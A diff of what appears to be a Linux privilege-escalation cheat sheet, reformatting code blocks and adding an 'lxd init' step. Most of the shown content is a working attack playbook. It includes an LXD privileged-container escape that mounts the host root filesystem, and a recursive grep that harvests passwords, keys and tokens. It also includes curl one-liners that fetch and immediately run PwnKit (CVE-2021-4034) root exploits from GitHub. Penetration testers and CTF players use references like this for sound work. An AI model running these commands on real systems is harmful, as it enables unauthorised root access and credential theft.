@@ -77,9 +77,10 @@ git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder 
 ```
 {% endcode %}
 
-```bash
-# Import the image
-lxc image import ./alpine.tar.gz --alias privimg
+<pre class="language-bash"><code class="lang-bash"><strong># Import the image
+</strong>lxc image import ./alpine.tar.gz --alias privimg
+# Initialize
+lxd init
 # Create the containter
 lxc init privimg privcont -c security.privileged=true
 # Mount the filesystem
@@ -88,7 +89,7 @@ lxc config device add privcont privdev disk source=/ path=/mnt/root recursive=tr
 lxc start privcont
 # Interactive shell
 lxc exec privcont /bin/sh
-```
+</code></pre>
 
 ## Sudo
 
@@ -141,11 +142,11 @@ ls -l /var/log/cron
 You can add words to the blacklist on the `grep -Ev` section.
 {% endhint %}
 
+{% code overflow="wrap" %}
 ```bash
-old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); \
-diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | \
-grep -Ev "kworker|user,command"; old_ps=$new_ps; done
+old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | grep -Ev "kworker|user,command"; old_ps=$new_ps; done
 ```
+{% endcode %}
 
 ## Writable Scripts
 
@@ -155,9 +156,11 @@ find / -user <USER> -writable \( -name "*.sh" -o -name "*.py" \) -type f 2>/dev/
 
 ## Passwords
 
+{% code overflow="wrap" %}
 ```bash
 grep -Eriao --color=always '(password|passwd|pass|pwd|key|secret|token)[[:space:]]*[:=][[:space:]]*[^[:space:]]{6,}' . | awk '{ line = $0; sub(/^[^:]*:[^:]*:/, "", line); if (!seen[line]++) print $0; }'
 ```
+{% endcode %}
 
 ## Exploits
 
@@ -165,14 +168,16 @@ grep -Eriao --color=always '(password|passwd|pass|pwd|key|secret|token)[[:space:
 
 [https://github.com/Almorabea/pkexec-exploit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
 
+{% code overflow="wrap" %}
 ```bash
-curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py \
--o PwnKit.py && python3 PwnKit.py
+curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py -o PwnKit.py && python3 PwnKit.py
 ```
+{% endcode %}
 
 [https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
 
+{% code overflow="wrap" %}
 ```bash
-curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \
--o PwnKit && chmod +x PwnKit && ./PwnKit
+curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x PwnKit && ./PwnKit
 ```
+{% endcode %}
